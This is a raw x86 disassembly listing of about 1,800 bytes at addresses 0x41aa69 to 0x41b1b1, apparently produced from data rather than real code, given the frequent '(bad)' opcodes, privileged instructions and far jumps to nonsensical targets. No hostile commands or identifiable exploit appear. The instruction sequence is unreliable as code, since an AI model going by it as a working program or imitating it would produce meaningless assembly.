  41aa69:	outs   dx,BYTE PTR ds:[esi]
  41aa6a:	shr    DWORD PTR [esi],cl
  41aa6c:	cli    
  41aa6d:	or     DWORD PTR [ebx],edx
  41aa6f:	xlat   BYTE PTR ds:[ebx]
  41aa70:	push   eax
  41aa71:	sahf   
  41aa72:	(bad)  
  41aa73:	and    bh,ah
  41aa75:	or     ch,bl
  41aa77:	push   esi
  41aa78:	cdq    
  41aa79:	hlt    
  41aa7a:	int    0x94
  41aa7c:	xor    eax,0x134be2d2
  41aa81:	adc    eax,0x68c657ff
  41aa86:	xor    edx,edi
  41aa88:	scas   eax,DWORD PTR es:[edi]
  41aa89:	aad    0x5
  41aa8b:	push   es
  41aa8c:	jns    0x41aa46
  41aa8e:	ins    BYTE PTR es:[edi],dx
  41aa8f:	push   0xd4696773
  41aa94:	xchg   ebx,eax
  41aa95:	mov    dh,0x30
  41aa97:	dec    edx
  41aa98:	fcmove st,st(2)
  41aa9a:	jo     0x41ab0b
  41aa9c:	shl    DWORD PTR [eax-0x15e67505],1
  41aaa2:	jmp    0xd444b874
  41aaa7:	out    0xe8,eax
  41aaa9:	mov    bh,BYTE PTR [ebp+edx*2-0x32]
  41aaad:	fbld   TBYTE PTR ds:[edx-0x1d]
  41aab1:	out    0x8b,al
  41aab3:	sub    DWORD PTR [edi+0x1bf799a1],edx
  41aab9:	xchg   ecx,eax
  41aaba:	(bad)  
  41aabb:	ret    0x6782
  41aabe:	cmp    esi,DWORD PTR [ecx+0x62]
  41aac1:	test   al,0x84
  41aac3:	(bad)  
  41aac4:	(bad)  
  41aac5:	iret   
  41aac6:	push   0xfffffffc
  41aac8:	mov    al,0xbb
  41aaca:	mov    bh,0x74
  41aacc:	adc    al,0x2d
  41aace:	xlat   BYTE PTR ds:[ebx]
  41aacf:	retf   0x2122
  41aad2:	jbe    0x41aae1
  41aad4:	clc    
  41aad5:	int3   
  41aad6:	scas   eax,DWORD PTR es:[edi]
  41aad7:	adc    eax,0xe9b08564
  41aadc:	in     eax,dx
  41aadd:	out    0xcb,eax
  41aadf:	cwde   
  41aae0:	or     eax,0x73960e2a
  41aae5:	rol    DWORD PTR [esi-0x49],0x33
  41aae9:	push   esi
  41aaea:	adc    bh,BYTE PTR [eax+0x4c]
  41aaed:	inc    eax
  41aaee:	jle    0x41aa7f
  41aaf0:	sbb    al,0x52
  41aaf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaf3:	bound  ecx,QWORD PTR [ecx-0x13727522]
  41aaf9:	ret    
  41aafa:	sub    BYTE PTR [ecx],0x1c
  41aafd:	jbe    0x41aa84
  41aaff:	in     eax,0xc1
  41ab01:	stc    
  41ab02:	jbe    0x41ab31
  41ab04:	adc    al,0xff
  41ab06:	pop    esi
  41ab07:	mov    eax,ds:0x22d02286
  41ab0c:	sbb    al,0x45
  41ab0e:	pop    esi
  41ab0f:	sub    edx,DWORD PTR [edx-0x3e]
  41ab12:	arpl   WORD PTR [ebx+0x4f],si
  41ab15:	sbb    eax,0xffffffc7
  41ab18:	jns    0x41ab59
  41ab1a:	ss sbb eax,0xf65fc1c5
  41ab20:	sub    edi,edx
  41ab22:	or     eax,0x63f0627
  41ab27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab28:	mov    edi,0xb5f7703c
  41ab2d:	and    BYTE PTR [esi],dh
  41ab2f:	sbb    eax,0x5774d460
  41ab34:	and    dl,cl
  41ab36:	pop    edi
  41ab37:	add    DWORD PTR [edx+0xed95a89],edx
  41ab3d:	sar    DWORD PTR [eax-0x22],0xee
  41ab41:	mov    edx,0xd74e7dd2
  41ab46:	pop    edi
  41ab47:	sub    eax,0x6959d2cc
  41ab4c:	mov    cl,0x68
  41ab4e:	rcl    esp,0x6f
  41ab51:	xchg   ecx,eax
  41ab52:	sbb    bh,ch
  41ab54:	popf   
  41ab55:	add    bh,BYTE PTR [eax]
  41ab57:	pop    es
  41ab58:	push   0x4589affa
  41ab5d:	idiv   BYTE PTR [eax]
  41ab5f:	addr16 push edi
  41ab61:	or     esi,DWORD PTR [ecx-0x51]
  41ab64:	ffreep st(6)
  41ab66:	nop
  41ab67:	xchg   ebx,eax
  41ab68:	mov    al,ds:0x5fd1ab3a
  41ab6d:	mov    cl,0x61
  41ab6f:	aam    0x8b
  41ab71:	cmp    DWORD PTR [esi+edi*8+0x2e],0x6f
  41ab76:	pop    esp
  41ab77:	mov    ds:0x276d1d7,al
  41ab7c:	cmp    eax,0x6a63b4d4
  41ab81:	fs clc 
  41ab83:	push   edi
  41ab84:	inc    esp
  41ab85:	xor    dh,al
  41ab87:	cdq    
  41ab88:	sbb    BYTE PTR [ebx-0xf43bf8],0xba
  41ab8f:	mov    cl,0x8f
  41ab91:	mov    BYTE PTR [ebx+0x6f42028],bl
  41ab97:	xchg   DWORD PTR [ecx+0x7],ebx
  41ab9a:	lock sbb ebx,esi
  41ab9d:	and    ebx,0xffffff87
  41aba0:	cld    
  41aba1:	mov    esp,0x394af6d6
  41aba6:	cmp    ch,BYTE PTR [ebx]
  41aba8:	xchg   ebx,eax
  41aba9:	call   0x89e9:0x921a2bd4
  41abb0:	iret   
  41abb1:	jo     0x41abff
  41abb3:	sbb    eax,0xd7740fd0
  41abb8:	ret    
  41abb9:	xchg   ecx,eax
  41abba:	xchg   edx,eax
  41abbb:	and    DWORD PTR [eax],edx
  41abbd:	adc    al,0x6d
  41abbf:	mov    esp,0x95c785f4
  41abc4:	pop    ecx
  41abc5:	aad    0xce
  41abc7:	mov    bh,BYTE PTR [eax+0x5c72a9e5]
  41abcd:	xchg   esp,eax
  41abce:	jmp    0x41abef
  41abd0:	ret    
  41abd1:	jnp    0x41abf1
  41abd3:	pop    ds
  41abd4:	xlat   BYTE PTR ds:[ebx]
  41abd5:	out    0x32,al
  41abd7:	push   esp
  41abd8:	mov    ah,0xf2
  41abda:	je     0x41ac0c
  41abdc:	xchg   ecx,eax
  41abdd:	inc    esp
  41abde:	inc    esi
  41abdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abe0:	lods   al,BYTE PTR ds:[esi]
  41abe1:	xchg   esp,eax
  41abe2:	js     0x41ab90
  41abe4:	mov    dl,0x2
  41abe6:	iret   
  41abe7:	adc    ecx,ebx
  41abe9:	ja     0x41abb6
  41abeb:	pop    eax
  41abec:	repz xor al,0xf0
  41abef:	sbb    BYTE PTR [ecx-0x63],al
  41abf2:	fs adc al,0x70
  41abf5:	sbb    edx,DWORD PTR [ebx+0x472eeb2b]
  41abfb:	push   eax
  41abfc:	outs   dx,DWORD PTR ds:[esi]
  41abfd:	mov    eax,0x84e480ab
  41ac02:	ret    
  41ac03:	dec    ebp
  41ac04:	and    eax,0x2ffbf24d
  41ac09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac0a:	out    0x64,al
  41ac0c:	in     eax,0xa8
  41ac0e:	std    
  41ac0f:	mov    ebx,gs
  41ac11:	add    eax,DWORD PTR [edx]
  41ac13:	in     al,0x8e
  41ac15:	fadd   DWORD PTR [edi]
  41ac17:	ins    BYTE PTR es:[edi],dx
  41ac18:	or     bh,BYTE PTR [esi+0x75]
  41ac1b:	addr16 jnp 0x41ac0a
  41ac1e:	pop    esi
  41ac1f:	aaa    
  41ac20:	xchg   DWORD PTR [ecx],edx
  41ac22:	sub    dh,ch
  41ac24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac25:	popa   
  41ac26:	xor    DWORD PTR [ebp-0x5f],esi
  41ac29:	imul   ecx,DWORD PTR [esi+0x27],0x0
  41ac2d:	xlat   BYTE PTR ds:[ebx]
  41ac2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac2f:	push   ecx
  41ac30:	or     edx,ecx
  41ac32:	mov    BYTE PTR ds:0x9e954a76,al
  41ac38:	jle    0x41ac64
  41ac3a:	adc    edx,DWORD PTR [ebp+0x79a93035]
  41ac40:	cmp    esi,ecx
  41ac42:	add    BYTE PTR [edx-0xc],ah
  41ac45:	dec    ecx
  41ac46:	dec    esp
  41ac47:	das    
  41ac48:	sub    BYTE PTR [edi+0x7828283e],bl
  41ac4e:	and    ch,bh
  41ac50:	in     eax,0x4f
  41ac52:	jbe    0x41ac0a
  41ac54:	fdivr  DWORD PTR [edi-0x20]
  41ac57:	adc    eax,0x82f48c38
  41ac5c:	sub    bh,bh
  41ac5e:	popa   
  41ac5f:	enter  0x43eb,0x82
  41ac63:	popf   
  41ac64:	mov    ch,bl
  41ac66:	rol    DWORD PTR [edx-0x59712137],cl
  41ac6c:	sbb    eax,0xae070148
  41ac71:	sub    DWORD PTR [ecx+ecx*8],ebp
  41ac74:	leave  
  41ac75:	out    0x8f,al
  41ac77:	jmp    0xfe7b6825
  41ac7c:	pop    edx
  41ac7d:	cmp    eax,0xb6dd11da
  41ac82:	das    
  41ac83:	sub    ecx,DWORD PTR [eax+0x10]
  41ac86:	loopne 0x41ac13
  41ac88:	fs js  0x41ac92
  41ac8b:	pop    esi
  41ac8c:	mov    esi,0xf8f920a6
  41ac91:	mov    ch,0x58
  41ac93:	adc    DWORD PTR ds:0xc6f7cc31,esp
  41ac99:	nop
  41ac9a:	jnp    0x41ac94
  41ac9c:	rcl    bh,cl
  41ac9e:	add    al,0xb5
  41aca0:	pop    ecx
  41aca1:	repnz fldcw WORD PTR [ebx]
  41aca4:	xchg   ebx,eax
  41aca5:	cmp    eax,0xfb04552a
  41acaa:	cdq    
  41acab:	rcl    BYTE PTR [edx-0x6d3765ab],1
  41acb1:	fisttp QWORD PTR [ebp+0x664871af]
  41acb7:	or     ch,BYTE PTR [esi-0xe40b69d]
  41acbd:	call   0x4125aa05
  41acc2:	ret    0xffa7
  41acc5:	push   0xffffffff
  41acc7:	mov    ah,0xe8
  41acc9:	or     eax,0x250a47ef
  41acce:	ret    
  41accf:	cmp    eax,0x561346a4
  41acd4:	lods   al,BYTE PTR ds:[esi]
  41acd5:	mov    eax,ds:0x823b0
  41acda:	mov    edi,0x6f248f9b
  41acdf:	(bad)  
  41ace0:	fucomp st(1)
  41ace2:	cmp    bl,BYTE PTR [esp+ebx*1-0x2e]
  41ace6:	outs   dx,BYTE PTR ds:[esi]
  41ace7:	scas   eax,DWORD PTR es:[edi]
  41ace8:	mov    cl,0x6f
  41acea:	jmp    0xd59d12e3
  41acef:	cld    
  41acf0:	pop    ebp
  41acf1:	je     0x41ad08
  41acf3:	and    esi,DWORD PTR [esi]
  41acf5:	mov    ds:0xdd596b4a,al
  41acfa:	push   cs
  41acfb:	push   edi
  41acfc:	pop    ebx
  41acfd:	push   cs
  41acfe:	add    eax,0xe5112872
  41ad03:	enter  0xf8e0,0x16
  41ad07:	jo     0x41acbe
  41ad09:	adc    ebx,DWORD PTR [ebx-0x5ec3df81]
  41ad0f:	fild   DWORD PTR [ecx]
  41ad11:	push   esi
  41ad12:	cwde   
  41ad13:	push   cs
  41ad14:	jle    0x41ac9b
  41ad16:	or     al,0xfc
  41ad18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad19:	or     DWORD PTR [ecx],esp
  41ad1b:	mov    eax,ds:0x10a3b267
  41ad20:	push   cs
  41ad21:	in     eax,0x44
  41ad23:	push   eax
  41ad24:	dec    eax
  41ad25:	inc    ebp
  41ad26:	jno    0x41ad5b
  41ad28:	jnp    0x41ad7d
  41ad2a:	pop    esp
  41ad2b:	in     al,0x20
  41ad2d:	xor    DWORD PTR [edx],edi
  41ad2f:	out    0xbe,al
  41ad31:	sub    DWORD PTR [eax-0x64b43d65],edi
  41ad37:	add    edi,DWORD PTR [ecx+0x1b]
  41ad3a:	sti    
  41ad3b:	push   es
  41ad3c:	in     al,0x13
  41ad3e:	popf   
  41ad3f:	mov    esp,0xfe936c56
  41ad44:	jp     0x41ad08
  41ad46:	mov    esp,0x6700be0
  41ad4b:	in     al,dx
  41ad4c:	aaa    
  41ad4d:	and    bl,dh
  41ad4f:	inc    ecx
  41ad50:	dec    esp
  41ad51:	enter  0x27c7,0x67
  41ad55:	adc    esi,esi
  41ad57:	jge    0x41ad88
  41ad59:	outs   dx,BYTE PTR ds:[esi]
  41ad5a:	push   ss
  41ad5b:	or     ebx,DWORD PTR [edi-0x37]
  41ad5e:	dec    ecx
  41ad5f:	addr16 ret 0x1034
  41ad63:	jmp    0xb602:0xdefb43fe
  41ad6a:	cmp    DWORD PTR [edx+0x17c9665e],ecx
  41ad70:	mov    eax,ds:0xca74417a
  41ad75:	adc    ah,0x30
  41ad78:	fnsave [eax+0x1c7e3b78]
  41ad7e:	add    DWORD PTR [edi],0xffffff82
  41ad81:	lock pop edx
  41ad83:	cwde   
  41ad84:	inc    eax
  41ad85:	mov    ch,0xad
  41ad87:	ds sahf 
  41ad89:	cld    
  41ad8a:	inc    esp
  41ad8b:	psrlq  mm7,mm0
  41ad8e:	sahf   
  41ad8f:	add    BYTE PTR [eax+0x73],dh
  41ad92:	dec    edx
  41ad93:	data16 clc 
  41ad95:	scas   eax,DWORD PTR es:[edi]
  41ad96:	pop    ds
  41ad97:	jp     0x41ad48
  41ad99:	xor    al,0x3a
  41ad9b:	push   edi
  41ad9c:	push   eax
  41ad9d:	and    eax,0x524ee466
  41ada2:	adc    DWORD PTR [esi],ebx
  41ada4:	jg     0x41ae1b
  41ada6:	fs push esi
  41ada8:	inc    esp
  41ada9:	dec    esi
  41adaa:	out    dx,al
  41adab:	das    
  41adac:	pop    esp
  41adad:	outs   dx,BYTE PTR ds:[esi]
  41adae:	popa   
  41adaf:	xor    BYTE PTR [edx-0x76],bh
  41adb2:	xchg   edi,eax
  41adb3:	jmp    0xc90d:0x3269be14
  41adba:	jno    0x41ad85
  41adbc:	fistp  QWORD PTR [ebx+0x6bb4218c]
  41adc2:	call   0x235421cf
  41adc7:	jge    0x41ae01
  41adc9:	shrd   ecx,ecx,cl
  41adcc:	leave  
  41adcd:	lahf   
  41adce:	aaa    
  41adcf:	stos   BYTE PTR es:[edi],al
  41add0:	inc    esi
  41add1:	in     al,dx
  41add2:	repnz sub BYTE PTR [eax+0x55],dl
  41add6:	dec    esp
  41add7:	mov    al,ds:0xf34e589e
  41addc:	or     edx,eax
  41adde:	(bad)
  41ade2:	mov    esi,0x58172e9f
  41ade7:	cmp    BYTE PTR [ebp-0x64],cl
  41adea:	popf   
  41adeb:	mov    ds:0x63c8b62b,al
  41adf0:	mov    bl,0xcb
  41adf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adf3:	cmp    al,0xf9
  41adf5:	dec    eax
  41adf6:	mov    edi,0x15c6571d
  41adfb:	push   ebx
  41adfc:	(bad)  
  41adfd:	adc    ah,dl
  41adff:	jno    0x41adb7
  41ae01:	inc    eax
  41ae02:	leave  
  41ae03:	push   esi
  41ae04:	(bad)  
  41ae06:	adc    eax,0x9c61a831
  41ae0b:	aad    0x4d
  41ae0d:	inc    esi
  41ae0e:	xchg   esi,eax
  41ae0f:	shl    DWORD PTR [ecx+0x6ef8edea],1
  41ae15:	aaa    
  41ae16:	iret   
  41ae17:	sbb    DWORD PTR [edi+ebx*1-0x2dd9b98a],ebp
  41ae1e:	imul   ecx,DWORD PTR [ebx+0x62badc73],0xfd262910
  41ae28:	js     0x41ae6c
  41ae2a:	xor    cl,ch
  41ae2c:	call   0x6dc:0xc2c64dd3
  41ae33:	pop    esp
  41ae34:	dec    ecx
  41ae35:	imul   edi,DWORD PTR [edx],0x4074844e
  41ae3b:	scas   al,BYTE PTR es:[edi]
  41ae3c:	sbb    DWORD PTR [edx],0xf505de1d
  41ae42:	inc    esi
  41ae43:	(bad)  
  41ae44:	dec    esp
  41ae45:	loop   0x41ae3d
  41ae47:	int    0x73
  41ae49:	bound  ecx,QWORD PTR [esi-0x61]
  41ae4c:	fwait
  41ae4d:	or     DWORD PTR [esi],0xfb409d7f
  41ae53:	aam    0x8f
  41ae55:	stc    
  41ae56:	stos   BYTE PTR es:[edi],al
  41ae57:	es xor dl,al
  41ae5a:	pop    ecx
  41ae5b:	ror    BYTE PTR [edi-0x45],0xec
  41ae5f:	mov    eax,DWORD PTR [eax+0x68]
  41ae62:	xchg   ebx,eax
  41ae63:	push   edi
  41ae64:	xor    al,0xc1
  41ae66:	inc    esi
  41ae67:	mov    eax,0xcb78a281
  41ae6c:	or     eax,0x66e46306
  41ae71:	aaa    
  41ae72:	mov    dl,ah
  41ae74:	push   edx
  41ae75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae76:	dec    ebx
  41ae77:	ins    BYTE PTR es:[edi],dx
  41ae78:	xchg   edx,eax
  41ae79:	mov    WORD PTR [ebp-0x3ef2d075],?
  41ae7f:	(bad)  
  41ae80:	sbb    dl,BYTE PTR [eax+0x23]
  41ae83:	jne    0x41aeb4
  41ae85:	nop
  41ae86:	mov    ds:0x8a92a78a,eax
  41ae8b:	aad    0xed
  41ae8d:	adc    al,0xb7
  41ae8f:	stos   DWORD PTR es:[edi],eax
  41ae90:	aam    0xe5
  41ae92:	mov    ds:0x71dc4f02,al
  41ae97:	sub    al,0xda
  41ae99:	adc    ch,ah
  41ae9b:	popa   
  41ae9c:	dec    ebx
  41ae9d:	loope  0x41ae68
  41ae9f:	test   eax,0x79ce6193
  41aea4:	sbb    BYTE PTR ss:[ebx-0xd163a83],dh
  41aeab:	mov    cl,0xdd
  41aead:	mov    dh,0x94
  41aeaf:	push   eax
  41aeb0:	push   0x1eb4f45e
  41aeb5:	and    al,0xb8
  41aeb7:	loope  0x41aef0
  41aeb9:	push   0x265df766
  41aebe:	pop    ecx
  41aebf:	mov    dl,0xce
  41aec1:	(bad)  
  41aec2:	jg     0x41af0a
  41aec4:	sahf   
  41aec5:	lods   al,BYTE PTR ds:[esi]
  41aec6:	push   esp
  41aec7:	fmul   QWORD PTR [bp+0x11]
  41aecb:	sbb    eax,0x18838231
  41aed0:	loop   0x41af2a
  41aed2:	pop    edx
  41aed3:	or     BYTE PTR [ebp-0xe],bh
  41aed6:	nop
  41aed7:	cmp    eax,0x1f43f653
  41aedc:	int    0xc5
  41aede:	repz out 0x56,al
  41aee1:	mov    ch,0xe9
  41aee3:	add    eax,0xb6aa6b17
  41aee8:	(bad)  
  41aee9:	pop    ebx
  41aeea:	jp     0x41aef1
  41aeec:	cmp    eax,0x6e72d67
  41aef1:	jle    0x41aee4
  41aef3:	rcr    BYTE PTR [eax+0x7f6949dc],0xc5
  41aefa:	inc    ebp
  41aefb:	mov    WORD PTR [ecx+0xc650906],fs
  41af01:	fnstcw WORD PTR [ecx]
  41af03:	(bad)  
  41af04:	cmp    BYTE PTR [edx+eax*1-0x22150db3],ah
  41af0b:	shl    al,0x20
  41af0e:	pop    ds
  41af0f:	xchg   ecx,eax
  41af10:	xor    ebp,DWORD PTR [esi+0x36]
  41af13:	ror    DWORD PTR ds:0x5626e65d,0xae
  41af1a:	jg     0x41af22
  41af1c:	les    edi,FWORD PTR gs:[ebx+edx*2+0x7e]
  41af21:	dec    ecx
  41af22:	dec    esi
  41af23:	fwait
  41af24:	stc    
  41af25:	ja     0x41aefc
  41af27:	xchg   ebp,eax
  41af28:	sbb    BYTE PTR [eax-0x72fb68d2],0xbd
  41af2f:	mov    WORD PTR [edi],fs
  41af31:	call   0x76ee:0xe3603edf
  41af38:	jno    0x41af9c
  41af3a:	jns    0x41aee8
  41af3c:	rcl    BYTE PTR [esi],0x7
  41af3f:	icebp  
  41af40:	jmp    0x41af41
  41af42:	and    dl,BYTE PTR [ebx+ecx*8]
  41af45:	jne    0x41af5a
  41af47:	dec    DWORD PTR [edi]
  41af49:	enter  0xa90c,0xb8
  41af4d:	dec    edx
  41af4e:	into   
  41af4f:	aas    
  41af50:	xchg   ebx,eax
  41af51:	push   ss
  41af52:	aam    0x1
  41af54:	enter  0xba47,0x6b
  41af58:	push   ebp
  41af59:	xor    DWORD PTR [eax],0xb1cd0cfc
  41af5f:	ror    ecx,cl
  41af61:	ret    0xabd4
  41af64:	dec    esp
  41af65:	dec    edi
  41af66:	xchg   ecx,eax
  41af67:	mov    eax,ds:0x25bef983
  41af6c:	std    
  41af6d:	xor    eax,DWORD PTR [ebx+0x32e91f95]
  41af73:	fldenv [esi]
  41af75:	ror    BYTE PTR [ecx+0x30],0x37
  41af79:	mov    eax,0xe14cba3
  41af7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af7f:	rol    DWORD PTR [ebx-0x1b],0xd1
  41af83:	fild   QWORD PTR [edx+0x62de1c40]
  41af89:	add    DWORD PTR [ebp+0x6b],esp
  41af8c:	xchg   edi,eax
  41af8d:	dec    edx
  41af8e:	xchg   edx,eax
  41af8f:	sub    al,0x3f
  41af92:	mov    bl,0x22
  41af94:	xchg   ebp,eax
  41af95:	pop    edi
  41af96:	xor    eax,DWORD PTR ds:0x921be896
  41af9c:	mov    ch,0xa3
  41af9e:	xchg   ecx,eax
  41af9f:	and    DWORD PTR [ebx],ecx
  41afa1:	pop    edx
  41afa2:	ss popa 
  41afa4:	lock sub eax,0x2991ce82
  41afaa:	sub    cl,BYTE PTR [edi]
  41afac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afad:	ss push esp
  41afaf:	in     eax,0x57
  41afb1:	sub    eax,ebp
  41afb3:	icebp  
  41afb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb5:	sbb    ah,bh
  41afb7:	gs xor ebx,eax
  41afba:	ret    0x9662
  41afbd:	xlat   BYTE PTR ds:[ebx]
  41afbe:	stos   BYTE PTR es:[edi],al
  41afbf:	adc    al,0xba
  41afc1:	gs xor dl,dl
  41afc4:	in     al,0xfc
  41afc6:	or     dl,BYTE PTR ds:0x2395c8a
  41afcc:	pop    ebx
  41afcd:	int3   
  41afce:	call   0x1b8a3559
  41afd3:	mov    dl,0x4d
  41afd5:	ins    DWORD PTR es:[edi],dx
  41afd6:	mov    bl,0x56
  41afd8:	fs (bad) 
  41afda:	cmc    
  41afdb:	mov    ds:0x49b4f527,eax
  41afe0:	stos   DWORD PTR es:[edi],eax
  41afe1:	pop    es
  41afe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afe3:	(bad)  
  41afe5:	inc    ebx
  41afe6:	jp     0x41af6a
  41afe8:	fwait
  41afe9:	in     eax,0x64
  41afeb:	pop    ds
  41afec:	and    ecx,ebp
  41afee:	(bad)  
  41afef:	mov    ecx,?
  41aff1:	mov    ah,0xce
  41aff3:	jle    0x41afde
  41aff5:	(bad)  
  41aff6:	jmp    0x41b041
  41aff8:	mov    DWORD PTR [ebx],eax
  41affa:	jmp    0x41b073
  41affc:	add    eax,0x3d5c3114
  41b001:	jg     0x41af97
  41b003:	adc    al,0xe5
  41b005:	fdivr  DWORD PTR [edi+ebx*8]
  41b008:	aas    
  41b009:	xchg   esi,eax
  41b00a:	mov    DWORD PTR ds:0xe2ddedc7,esi
  41b010:	div    BYTE PTR [eax]
  41b012:	imul   edx,DWORD PTR [edi],0x6d
  41b015:	shl    DWORD PTR [esi-0x30c52499],1
  41b01b:	mov    bh,0xf6
  41b01d:	fcomp  QWORD PTR [edx-0x72]
  41b020:	and    DWORD PTR [ebp-0x3e],edi
  41b023:	lock add ah,0xa6
  41b027:	mov    ebp,0xaa6612ba
  41b02c:	fmul   DWORD PTR [ecx]
  41b02e:	jmp    0x834b:0xd9185a4b
  41b035:	pusha  
  41b036:	inc    ebx
  41b037:	push   es
  41b038:	mov    ecx,0xef713ba8
  41b03d:	loopne 0x41afdf
  41b03f:	cmp    DWORD PTR [eax+0x7],edx
  41b042:	into   
  41b043:	adc    al,dh
  41b045:	pop    es
  41b046:	test   DWORD PTR ss:[eax-0x60],edx
  41b04a:	lahf   
  41b04b:	xlat   BYTE PTR ds:[ebx]
  41b04c:	pop    eax
  41b04d:	sti    
  41b04e:	inc    ebp
  41b04f:	mov    ds,WORD PTR [esi+0x545de7af]
  41b055:	xchg   DWORD PTR [eax+0x1b],esp
  41b058:	fcomi  st,st(4)
  41b05a:	mov    al,0x1e
  41b05c:	push   edx
  41b05d:	fcomi  st,st(7)
  41b05f:	stos   DWORD PTR es:[edi],eax
  41b060:	pop    ebp
  41b061:	add    al,0xe3
  41b063:	lods   al,BYTE PTR ds:[esi]
  41b064:	out    dx,al
  41b065:	push   edx
  41b066:	cld    
  41b067:	loopne 0x41b0c4
  41b069:	jne    0x41b0a8
  41b06b:	mov    edi,0x97673cdb
  41b070:	lods   eax,DWORD PTR ds:[esi]
  41b071:	cs cli 
  41b073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b074:	jne    0x41b066
  41b076:	add    bh,bl
  41b078:	or     ebx,DWORD PTR [esp+eax*8-0x61ef0aee]
  41b07f:	add    al,0x2f
  41b081:	ret    
  41b082:	(bad)  
  41b083:	rcl    DWORD PTR [edi],1
  41b085:	fwait
  41b086:	(bad)  
  41b087:	lods   eax,DWORD PTR ds:[esi]
  41b088:	scas   al,BYTE PTR es:[edi]
  41b089:	pushf  
  41b08a:	sar    BYTE PTR [edx+0x7c],1
  41b08d:	cwde   
  41b08e:	lods   eax,DWORD PTR es:[esi]
  41b090:	dec    esi
  41b091:	fld    TBYTE PTR [esi+0x7e839dd9]
  41b097:	xchg   esp,eax
  41b098:	dec    edi
  41b099:	pop    es
  41b09a:	xchg   ecx,eax
  41b09b:	repnz jecxz 0x41b0ba
  41b09e:	ret    0x5f0d
  41b0a1:	add    al,0x33
  41b0a3:	(bad)  
  41b0a4:	ds push ds
  41b0a6:	add    al,0xaf
  41b0a8:	(bad)  
  41b0a9:	cli    
  41b0aa:	dec    esp
  41b0ab:	imul   esi,DWORD PTR [ebx-0x2c90ef80],0x26
  41b0b2:	bswap  esi
  41b0b4:	outs   dx,DWORD PTR ds:[esi]
  41b0b5:	xchg   ebp,eax
  41b0b6:	or     cl,cl
  41b0b8:	mov    edx,0x9cb28126
  41b0bd:	add    BYTE PTR [edx+0x49],0x3c
  41b0c1:	jmp    0x41b0b7
  41b0c3:	jb     0x41b0c1
  41b0c5:	in     eax,0x97
  41b0c7:	and    BYTE PTR [edi-0x78],cl
  41b0ca:	sub    edi,DWORD PTR [esi-0x601d65cc]
  41b0d0:	shr    BYTE PTR [ecx],0x50
  41b0d3:	or     DWORD PTR [esi],edx
  41b0d5:	in     al,0xde
  41b0d7:	sbb    al,0xaa
  41b0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0da:	mov    ebp,0xa9065380
  41b0df:	and    BYTE PTR [ebp-0x19],dl
  41b0e2:	lock sbb eax,0x5d9382b3
  41b0e8:	imul   esp,DWORD PTR [esp+ebx*1+0x3fc6c25],0x4bcd2918
  41b0f3:	push   eax
  41b0f4:	xor    BYTE PTR [ecx],bh
  41b0f6:	icebp  
  41b0f7:	and    eax,0x70c3d182
  41b0fc:	loop   0x41b098
  41b0fe:	xchg   BYTE PTR [ebp-0x3367419],dh
  41b104:	adc    eax,0x17be35aa
  41b109:	push   0xffffffcb
  41b10b:	dec    esi
  41b10c:	mov    edx,0xab2af2ef
  41b111:	lock aam 0xea
  41b114:	pop    ecx
  41b115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b116:	aaa    
  41b117:	mov    ds:0xee97c03a,al
  41b11c:	(bad)  
  41b11d:	cdq    
  41b11e:	popa   
  41b11f:	mov    ch,0x3c
  41b121:	dec    esi
  41b122:	das    
  41b123:	pop    es
  41b124:	adc    ah,BYTE PTR [ecx-0x5e]
  41b127:	add    al,0xe
  41b129:	cmp    bl,BYTE PTR [ebx]
  41b12b:	daa    
  41b12c:	aam    0xfa
  41b12e:	cdq    
  41b12f:	mov    ebx,0x45738438
  41b134:	outs   dx,DWORD PTR ds:[esi]
  41b135:	sub    BYTE PTR [edi+0x4910a88b],ah
  41b13b:	cmp    al,0xec
  41b13d:	sub    edx,DWORD PTR [ecx]
  41b13f:	mov    cl,0xe4
  41b141:	jle    0x41b1a0
  41b143:	daa    
  41b144:	mov    ds:0x9afe1f3c,eax
  41b149:	mov    esp,0xb9114f8f
  41b14e:	xor    eax,0xc4d0a5c5
  41b153:	(bad)  
  41b154:	mov    bh,0xd2
  41b156:	mov    WORD PTR ds:[edi-0x8],?
  41b15a:	in     al,0x1a
  41b15c:	mov    dl,0x78
  41b15e:	push   ecx
  41b15f:	aas    
  41b160:	mov    fs,ebp
  41b162:	loop   0x41b1a6
  41b164:	int3   
  41b165:	stos   DWORD PTR es:[edi],eax
  41b166:	dec    ebp
  41b167:	scas   al,BYTE PTR es:[edi]
  41b168:	std    
  41b169:	in     al,dx
  41b16a:	mov    eax,0xa183a9fb
  41b16f:	or     eax,0x5f4d76ca
  41b174:	push   0xffffffbf
  41b176:	aaa    
  41b177:	push   0x71
  41b179:	xor    DWORD PTR [eax],esp
  41b17b:	bound  eax,QWORD PTR [edi]
  41b17d:	lods   al,BYTE PTR ds:[esi]
  41b17e:	jge    0x41b12d
  41b180:	ins    BYTE PTR es:[edi],dx
  41b181:	adc    ecx,DWORD PTR [ebp-0x35f9f5e6]
  41b187:	imul   ebx,DWORD PTR [ecx-0x578e8744],0xfc0828bd
  41b191:	outs   dx,BYTE PTR ds:[esi]
  41b192:	and    DWORD PTR [edx+ebp*4],ebx
  41b195:	and    eax,0xf70d80ff
  41b19a:	xor    BYTE PTR [esp+esi*8],bh
  41b19d:	inc    ebx
  41b19e:	sub    cl,BYTE PTR [esi+ebx*2-0xb]
  41b1a2:	shl    BYTE PTR [eax-0x525ed739],cl
  41b1a8:	in     eax,dx
  41b1a9:	inc    ebx
  41b1aa:	rcr    esp,cl
  41b1ac:	mov    dl,0x23
  41b1ae:	fs mov ah,0x15
  41b1b1:	push   ebx
